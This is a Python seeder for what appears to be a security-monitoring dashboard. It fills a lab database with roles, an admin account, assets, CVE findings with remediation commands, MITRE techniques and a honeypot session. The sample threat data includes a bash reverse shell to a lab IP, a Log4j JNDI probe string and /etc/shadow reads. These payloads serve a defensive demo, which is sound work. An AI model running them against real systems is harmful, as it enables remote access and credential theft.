"""
Database Seeder with Comprehensive Security Baseline
Seeds default roles, admin account, lab assets, vulnerabilities, CVE mappings,
honeypot sessions with terminal command history, initial threats, and MITRE techniques.
"""

import logging
import uuid
from datetime import datetime, timezone, timedelta
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from app.database.postgres import async_session_factory
from app.models.user import User, Role, UserRole, DEFAULT_ROLES
from app.models.audit_log import AuditLog
from app.models.security_entities import (
    Asset,
    Threat,
    HoneypotSession,
    TerminalEvent,
    Vulnerability,
    Remediation,
    MitreTechnique,
    AgentTask,
)
from app.security.authentication import hash_password
from app.config.settings import settings
from app.services.mitre_service import MITRE_TECHNIQUES_CATALOG

logger = logging.getLogger("cyberary.seed")


async def seed_database():
    """Seed comprehensive security database on startup."""
    async with async_session_factory() as session:
        # 1. Seed Roles
        for role_data in DEFAULT_ROLES:
            res = await session.execute(select(Role).where(Role.name == role_data["name"]))
            if not res.scalar_one_or_none():
                session.add(Role(
                    name=role_data["name"],
                    description=role_data["description"],
                    permissions=role_data["permissions"],
                ))
        await session.flush()

        # 2. Seed Admin User
        admin_res = await session.execute(
            select(User).where(User.username == settings.DEFAULT_ADMIN_USERNAME)
        )
        admin = admin_res.scalar_one_or_none()
        if not admin:
            admin = User(
                username=settings.DEFAULT_ADMIN_USERNAME,
                email=settings.DEFAULT_ADMIN_EMAIL,
                password_hash=hash_password(settings.DEFAULT_ADMIN_PASSWORD),
                is_active=True,
            )
            session.add(admin)
            await session.flush()

            admin_role_res = await session.execute(select(Role).where(Role.name == "ADMIN"))
            admin_role = admin_role_res.scalar_one_or_none()
            if admin_role:
                session.add(UserRole(user_id=admin.id, role_id=admin_role.id))
            logger.info(f"  Created default admin user: {settings.DEFAULT_ADMIN_USERNAME}")

        # 3. Seed Assets
        assets_data = [
            {
                "name": "lab-server-01",
                "ip_address": "10.0.1.10",
                "hostname": "lab-server-01.cyberary.local",
                "asset_type": "linux",
                "importance": "CRITICAL",
                "risk_score": 82,
            },
            {
                "name": "lab-server-02",
                "ip_address": "10.0.1.11",
                "hostname": "lab-server-02.cyberary.local",
                "asset_type": "linux",
                "importance": "HIGH",
                "risk_score": 64,
            },
            {
                "name": "lab-honeypot-01",
                "ip_address": "10.0.1.20",
                "hostname": "lab-honeypot-01.cyberary.local",
                "asset_type": "honeypot",
                "importance": "MEDIUM",
                "risk_score": 45,
            },
            {
                "name": "ubuntu-telemetry-vm",
                "ip_address": "192.168.56.103",
                "hostname": "ubuntu-telemetry.lab.local",
                "asset_type": "linux",
                "importance": "CRITICAL",
                "risk_score": 75,
            },
        ]

        asset_map = {}
        for a_data in assets_data:
            a_res = await session.execute(select(Asset).where(Asset.name == a_data["name"]))
            existing_asset = a_res.scalar_one_or_none()
            if not existing_asset:
                new_asset = Asset(
                    name=a_data["name"],
                    ip_address=a_data["ip_address"],
                    hostname=a_data["hostname"],
                    environment="LAB",
                    asset_type=a_data["asset_type"],
                    importance=a_data["importance"],
                    status="ONLINE",
                    is_authorized=True,
                    last_scan=datetime.now(timezone.utc) - timedelta(hours=2),
                    risk_score=a_data["risk_score"],
                )
                session.add(new_asset)
                await session.flush()
                asset_map[a_data["name"]] = new_asset
            else:
                asset_map[a_data["name"]] = existing_asset

        # 4. Seed Vulnerabilities & Remediations
        target_asset = asset_map.get("lab-server-01")
        if target_asset:
            vuln_samples = [
                {
                    "finding_id": "F-101",
                    "title": "OpenSSH PKCS#11 Provider Remote Code Execution",
                    "cve_id": "CVE-2023-38408",
                    "cvss_score": 9.8,
                    "severity": "CRITICAL",
                    "service": "OpenSSH 8.9p1 (Port 22)",
                    "desc": "Insufficient library path sanitization in PKCS#11 provider allows arbitrary shared library loading.",
                    "evidence": "Banner response: SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6; ForwardAgent enabled.",
                    "fix": "Upgrade OpenSSH to >= 9.3p2 or disable Agent forwarding.",
                    "cmd": "sudo apt-get update && sudo apt-get --only-upgrade install openssh-server -y",
                    "expected": "OpenSSH upgraded to latest security patch.",
                    "verify": "ssh -V && grep -i 'PKCS11Provider' /etc/ssh/sshd_config",
                    "rollback": "apt-get install openssh-server=1:8.9p1-3ubuntu0.6",
                },
                {
                    "finding_id": "F-102",
                    "title": "OpenSSH Signal Handler Race Condition (RegreSSHion)",
                    "cve_id": "CVE-2024-6387",
                    "cvss_score": 8.1,
                    "severity": "HIGH",
                    "service": "OpenSSH Daemon (Port 22)",
                    "desc": "Signal handler race condition in sshd on glibc Linux allows unauthenticated remote code execution.",
                    "evidence": "SIGALRM timing analysis confirms vulnerable asynchronous signal handler window.",
                    "fix": "Set LoginGraceTime to 0 in sshd_config.",
                    "cmd": "sudo sed -i 's/^#\\?LoginGraceTime.*/LoginGraceTime 0/' /etc/ssh/sshd_config && sudo systemctl reload sshd",
                    "expected": "LoginGraceTime set to 0, eliminating race condition window.",
                    "verify": "sshd -T | grep -i 'logingracetime'",
                    "rollback": "sudo sed -i 's/^LoginGraceTime.*/LoginGraceTime 120/' /etc/ssh/sshd_config && sudo systemctl reload sshd",
                },
                {
                    "finding_id": "F-103",
                    "title": "Apache Log4j2 JNDI Remote Code Execution Vulnerability",
                    "cve_id": "CVE-2021-44228",
                    "cvss_score": 10.0,
                    "severity": "CRITICAL",
                    "service": "Java Application Service (Port 8080)",
                    "desc": "Log4j JNDI lookup allows remote execution via attacker-controlled LDAP endpoints.",
                    "evidence": "Header probe '${jndi:ldap://127.0.0.1:1389/a}' triggered internal DNS resolution callback.",
                    "fix": "Pass -Dlog4j2.formatMsgNoLookups=true flag globally.",
                    "cmd": "echo 'LOG4J_FORMAT_MSG_NO_LOOKUPS=true' | sudo tee -a /etc/environment",
                    "expected": "JNDI message lookup disabled globally across JVM services.",
                    "verify": "ps aux | grep -i 'formatMsgNoLookups'",
                    "rollback": "sed -i '/LOG4J_FORMAT_MSG_NO_LOOKUPS/d' /etc/environment",
                },
                {
                    "finding_id": "F-104",
                    "title": "Weak Sudo Configuration: Passwordless Shell Access",
                    "cve_id": None,
                    "cvss_score": 7.8,
                    "severity": "HIGH",
                    "service": "sudoers (Local PAM)",
                    "desc": "Local analyst account has NOPASSWD access to /bin/bash via sudoers.",
                    "evidence": "Sudo listing shows: (ALL : ALL) NOPASSWD: ALL for service account.",
                    "fix": "Require password authentication for elevated sudo actions.",
                    "cmd": "sudo sed -i 's/NOPASSWD://g' /etc/sudoers.d/*",
                    "expected": "NOPASSWD directive stripped from all sudoers includes.",
                    "verify": "sudo -l",
                    "rollback": "Restore backup /etc/sudoers.d/ from /var/backups/sudoers.bak",
                },
            ]

            for s in vuln_samples:
                v_res = await session.execute(select(Vulnerability).where(Vulnerability.finding_id == s["finding_id"]))
                if not v_res.scalar_one_or_none():
                    new_v = Vulnerability(
                        finding_id=s["finding_id"],
                        asset_id=target_asset.id,
                        title=s["title"],
                        description=s["desc"],
                        cve_id=s["cve_id"],
                        cvss_score=s["cvss_score"],
                        severity=s["severity"],
                        affected_service=s["service"],
                        confidence=0.94,
                        status="OPEN",
                        evidence=s["evidence"],
                        discovered_at=datetime.now(timezone.utc) - timedelta(hours=3),
                    )
                    session.add(new_v)
                    await session.flush()

                    # Remediation
                    rem = Remediation(
                        remediation_code=f"REM-{s['finding_id'].replace('F-', '')}",
                        vulnerability_id=new_v.id,
                        issue=s["title"],
                        severity=s["severity"],
                        risk_score=int(s["cvss_score"] * 9),
                        recommended_fix=s["fix"],
                        proposed_command=s["cmd"],
                        expected_result=s["expected"],
                        verification_step=s["verify"],
                        rollback_plan=s["rollback"],
                        status="PENDING",
                        created_at=datetime.now(timezone.utc) - timedelta(hours=3),
                    )
                    session.add(rem)

        # 5. Seed MITRE Techniques Catalog
        for tech in MITRE_TECHNIQUES_CATALOG:
            m_res = await session.execute(
                select(MitreTechnique).where(MitreTechnique.technique_id == tech["technique_id"])
            )
            if not m_res.scalar_one_or_none():
                session.add(MitreTechnique(
                    technique_id=tech["technique_id"],
                    name=tech["name"],
                    tactic=tech["tactic"],
                    description=tech["description"],
                    detection_count=tech["detection_count"],
                    confidence=tech["confidence"],
                ))

        # 6. Seed Initial Threats
        threat_samples = [
            {
                "event_id": "EVT-001",
                "title": "SSH brute force attempt detected",
                "source": "Honeypot",
                "severity": "HIGH",
                "status": "Active",
                "mitre_technique": "T1110.001",
                "mitre_tactic": "Credential Access",
                "intent": "Automated Password Guessing",
                "impact": "Potential unauthorized SSH access.",
                "confidence": 0.94,
                "raw_payload": "Multiple failed SSH password attempts for user 'root' from 10.0.1.105",
            },
            {
                "event_id": "EVT-002",
                "title": "Credential discovery: /etc/shadow read attempt",
                "source": "Honeypot",
                "severity": "CRITICAL",
                "status": "Active",
                "mitre_technique": "T1555",
                "mitre_tactic": "Credential Access",
                "intent": "Credential Store Extraction",
                "impact": "Exfiltration of system password hashes.",
                "confidence": 0.96,
                "raw_payload": "cat /etc/shadow",
            },
            {
                "event_id": "EVT-003",
                "title": "Outdated OpenSSH version detected",
                "source": "Assessment",
                "severity": "MEDIUM",
                "status": "Investigating",
                "mitre_technique": "T1190",
                "mitre_tactic": "Initial Access",
                "intent": "Vulnerable Service Fingerprinting",
                "impact": "Target service susceptible to CVE-2023-38408.",
                "confidence": 0.91,
                "raw_payload": "Banner: SSH-2.0-OpenSSH_8.9p1",
            },
            {
                "event_id": "EVT-004",
                "title": "Reverse shell connection attempt blocked",
                "source": "Honeypot",
                "severity": "CRITICAL",
                "status": "Blocked",
                "mitre_technique": "T1059.004",
                "mitre_tactic": "Execution",
                "intent": "Interactive Remote Shell Foothold",
                "impact": "Attacker attempted interactive reverse TCP shell.",
                "confidence": 0.98,
                "raw_payload": "bash -i >& /dev/tcp/10.0.1.105/4444 0>&1",
            },
            {
                "event_id": "EVT-005",
                "title": "Internal network port scan detected",
                "source": "Assessment",
                "severity": "LOW",
                "status": "Monitoring",
                "mitre_technique": "T1046",
                "mitre_tactic": "Discovery",
                "intent": "Port & Service Enumeration",
                "impact": "Mapping active listening TCP ports.",
                "confidence": 0.88,
                "raw_payload": "SYN probe across ports 22, 80, 443, 8080",
            },
        ]

        for t in threat_samples:
            t_res = await session.execute(select(Threat).where(Threat.event_id == t["event_id"]))
            if not t_res.scalar_one_or_none():
                sev = t["severity"]
                default_risk = 90.0 if sev == "CRITICAL" else (75.0 if sev == "HIGH" else (50.0 if sev == "MEDIUM" else 25.0))
                session.add(Threat(
                    event_id=t["event_id"],
                    title=t["title"],
                    source=t["source"],
                    severity=t["severity"],
                    status=t["status"],
                    mitre_technique=t["mitre_technique"],
                    mitre_tactic=t["mitre_tactic"],
                    intent=t["intent"],
                    impact=t["impact"],
                    confidence=t["confidence"],
                    risk_score=float(t.get("risk_score", default_risk)),
                    raw_payload=t["raw_payload"],
                    timestamp=datetime.now(timezone.utc) - timedelta(minutes=15),
                ))

        # 7. Seed Honeypot Session & Timeline
        hp_sess_res = await session.execute(select(HoneypotSession).where(HoneypotSession.session_code == "SESS-LAB-001"))
        hp_session = hp_sess_res.scalar_one_or_none()
        if not hp_session:
            hp_session = HoneypotSession(
                id=str(uuid.uuid4()),
                session_code="SESS-LAB-001",
                attacker_ip="10.0.1.105",
                username="root",
                status="ACTIVE",
                protocol="SSH",
                start_time=datetime.now(timezone.utc) - timedelta(minutes=30),
                threat_level="CRITICAL",
                command_count=5,
            )
            session.add(hp_session)
            await session.flush()

            commands_timeline = [
                ("whoami", "root", "System Environment & Kernel Profiling", "T1082", "Discovery", "LOW"),
                ("uname -a", "Linux lab-honeypot-01 5.15.0-89-generic #99-Ubuntu x86_64 GNU/Linux", "System Information Discovery", "T1082", "Discovery", "LOW"),
                ("cat /etc/passwd", "root:x:0:0:root:/root:/bin/bash\nanalyst:x:1000:1000:...", "Account Discovery", "T1087.001", "Discovery", "MEDIUM"),
                ("cat /etc/shadow", "root:$6$rounds=656000$s9K8fJ2a$9vQ7W5p2J...:19738:0:99999:7:::", "Credential Store Extraction", "T1555", "Credential Access", "CRITICAL"),
                ("sudo -l", "(ALL : ALL) ALL", "Local Privilege Escalation Attempt", "T1548.001", "Privilege Escalation", "CRITICAL"),
            ]

            for idx, (cmd, resp, intent, tech, tactic, sev) in enumerate(commands_timeline):
                session.add(TerminalEvent(
                    session_id=hp_session.id,
                    command=cmd,
                    response=resp,
                    intent=intent,
                    mitre_technique=tech,
                    mitre_tactic=tactic,
                    severity=sev,
                    timestamp=datetime.now(timezone.utc) - timedelta(minutes=25 - idx * 4),
                ))

        await session.commit()
        logger.info("✅ Database successfully seeded with full security domain data.")
